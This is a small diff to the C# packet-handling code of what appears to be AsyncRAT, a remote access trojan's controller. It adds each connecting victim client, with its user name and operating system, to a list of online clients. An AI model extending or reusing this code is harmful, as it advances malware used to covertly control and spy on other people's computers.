@@ -27,6 +27,7 @@ namespace AsyncRAT_Sharp.Handle_Packet
                                 client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("User").AsString);
                                 client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("OS").AsString);
                                 Program.form1.listView1.Items.Insert(0, client.LV);
+                                Settings.Online.Add(client);
                             }));
                         }
                             break;
